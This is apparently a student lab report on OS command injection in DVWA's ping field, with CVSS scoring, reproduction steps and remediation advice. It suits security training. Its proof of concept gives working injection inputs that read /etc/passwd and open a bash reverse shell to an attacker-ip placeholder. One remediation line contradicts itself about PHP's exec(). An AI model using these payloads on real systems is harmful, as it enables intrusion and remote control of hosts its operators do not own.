# Vulnerability Report

 CVE-ID: EDU-WEBLAB-2026-TEAM2-011

**Title:** OS Command Injection via Unsanitized IP Input Allowing Arbitrary System Command Execution

**Affected Lab:** DVWA — Command Injection Lab

**Component:** Ping Command Handler — IP Address Input Field (`/vulnerabilities/exec/`)

**Severity:** Critical

**CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

**CVSS Score:** 9.8

**Description:**
A critical OS command injection vulnerability was identified in the DVWA Command Injection module, where the application passes the user-supplied `ip` parameter directly into a server-side shell command without any sanitization, escaping, metacharacter filtering, or input validation. The application constructs the underlying ping invocation by naively concatenating raw user input into the shell command string, enabling an attacker to break out of the intended command context by appending standard shell operators — including semicolon (`;`), double-ampersand (`&&`), and pipe (`|`) — followed by arbitrary system commands of the attacker's choosing. Because the web server process executes the injected commands under its own runtime account (typically `www-data`), an attacker can immediately enumerate the host environment, read sensitive files such as `/etc/passwd`, and chain further exploitation techniques including privilege escalation or deployment of a persistent reverse shell. The complete absence of any server-side control over the command execution context makes this a critical-severity vulnerability that represents a total failure of the application's input handling and requires immediate remediation.

**Proof of Concept:**
```bash
# --- STEP 1: Confirm normal application behavior ---
# Submit a benign IP address to verify the ping command executes as expected
Input: 127.0.0.1
# Expected output: standard ping response (PING 127.0.0.1 ...)
```
```bash
# --- STEP 2: Basic command injection using semicolon operator ---
# Confirm injection is possible by appending whoami after the IP
Input: 127.0.0.1; whoami

# Expected output:
# PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
# ...
# www-data        <-- confirms injected command executed as web server user
```
```bash
# --- STEP 3: Enumerate the host filesystem ---
Input: 127.0.0.1; ls -la /var/www/html

# --- STEP 4: Read sensitive system files via double-ampersand operator ---
Input: 127.0.0.1 && cat /etc/passwd

# Expected output: full contents of /etc/passwd confirming unauthorized
# read access to sensitive system credential data

# --- STEP 5: Gather OS and kernel information via pipe operator ---
Input: 127.0.0.1 | uname -a

# Expected output: full kernel version, hostname, and OS details
# e.g., Linux dvwa 5.15.0-91-generic #101-Ubuntu SMP ...

# --- STEP 6: Establish a reverse shell for persistent remote access ---
# On attacker machine, start a Netcat listener:
nc -lvnp 4444

# Inject reverse shell payload via the vulnerable input field:
Input: 127.0.0.1; bash -c "bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1"

# Expected result: interactive reverse shell session established on the
# Netcat listener, confirming full Remote Code Execution on the target host
```

**Steps to Reproduce:**

1. Log in to the DVWA application at `http://10.6.6.13/login.php` using valid credentials (e.g., `admin` / `password`), navigate to **DVWA Security**, and confirm the Security Level is set to **Low**.
2. Navigate to the Command Injection module at `http://10.6.6.13/vulnerabilities/exec/` and observe the single IP address input field accompanied by a **Ping** submit button.
3. Enter a benign, valid IP address (`127.0.0.1`) in the input field and click **Ping**. Observe the standard ping response rendered in the page output, confirming that the application executes a server-side ping command using the supplied value.
4. **Test for command injection using the semicolon operator:** Clear the input field and enter `127.0.0.1; whoami`. Submit the form and observe that the page output displays both the ping results and the output of the `whoami` command (e.g., `www-data`), confirming that the injected command was executed by the server.
5. **Expand the injection to enumerate the filesystem:** Enter `127.0.0.1; ls -la /var/www/html` and submit. Observe that the server returns a full directory listing of the web root, confirming unrestricted filesystem enumeration capability via the injected command.
6. **Read sensitive system files using the double-ampersand operator:** Enter `127.0.0.1 && cat /etc/passwd` and submit. Observe that the full contents of `/etc/passwd` are rendered in the page output, confirming unauthorized read access to sensitive system credential data.
7. **Confirm cross-operator exploitability using the pipe operator:** Enter `127.0.0.1 | uname -a` and submit. Observe that the kernel version, hostname, and OS details are returned, confirming that multiple shell operators independently trigger command injection without any filtering or operator-specific mitigation.
8. **Escalate to a reverse shell for persistent access:** On the attacker machine, start a Netcat listener with `nc -lvnp 4444`. Return to the vulnerable input field and enter `127.0.0.1; bash -c "bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1"`, then submit the form.
9. Observe that an interactive reverse shell session is established in the Netcat listener on the attacker machine. Execute `id`, `whoami`, and `hostname` within the shell session to confirm the identity and privilege level of the compromised process.
10. Verify complete system compromise by navigating the filesystem, reading configuration files, and confirming that all actions execute under the web server account's privileges — demonstrating the full impact of unauthenticated arbitrary command execution via the unsanitized `ip` parameter.

**Remediation:**

1. **Replace shell-invoking functions with safe, parameterized system API calls:** Refactor the ping functionality to use language-native network APIs (e.g., PHP's `exec()` with a fixed command array, or ICMP socket libraries) that do not pass input through a shell interpreter. Eliminate all use of `system()`, `shell_exec()`, `exec()`, `passthru()`, and `popen()` with user-controlled input.
2. **Implement strict allowlist-based input validation for the IP address field:** Accept only values that match a valid IPv4 address format enforced by a server-side regex (e.g., `^(\d{1,3}\.){3}\d{1,3}$`) with additional range checks (0–255 per octet). Reject all non-conforming input with an `HTTP 400 Bad Request` response before any command construction occurs.
3. **Escape and strip all shell metacharacters from user input as a defense-in-depth measure:** If shell invocation cannot be fully eliminated, apply rigorous escaping of all shell metacharacters — including `;`, `|`, `&`, `` ` ``, `$`, `(`, `)`, `<`, `>`, `\n`, and whitespace — using language-native escaping functions (e.g., PHP's `escapeshellarg()`) before incorporating any user input into a shell command string.
4. **Disable dangerous PHP functions at the runtime configuration level:** Set `disable_functions = exec, system, shell_exec, passthru, popen, proc_open` in `php.ini` to prevent any code path — including third-party libraries — from invoking shell commands. This server-level control removes the execution primitive entirely, regardless of application-level sanitization gaps.
5. **Apply the principle of least privilege to the web server process:** Ensure the web server runs under a dedicated, non-privileged account (e.g., `www-data`) with permissions restricted exclusively to the web root directory. Deny this account access to sensitive system files (`/etc/shadow`, `/root/`), network utilities, and shell binaries to limit the impact of any successful injection.
6. **Deploy a Web Application Firewall (WAF) with command injection detection rules:** Configure WAF rules to detect and block requests containing shell metacharacters and common injection operators (`;`, `&&`, `||`, `|`, backtick sequences) within input parameters associated with system utility endpoints, as a perimeter-level defense-in-depth layer.
7. **Implement comprehensive logging and real-time alerting on the command execution endpoint:** Record every request to `/vulnerabilities/exec/` — or its production equivalent — including the full parameter value, source IP, session identifier, and timestamp. Configure real-time alerts for inputs containing shell operators or values that do not conform to the expected IP address format, and treat all such events as active exploitation indicators requiring immediate investigation.
8. **Conduct a full codebase audit to identify and remediate all additional instances of unsanitized shell command construction:** Perform static analysis and manual code review across all application modules that interact with system utilities to identify any other locations where user-controlled input is passed to shell-executing functions, and apply the same remediations uniformly across the entire codebase.

**Discovered By:** Team 2

**Date:** March 8, 2026
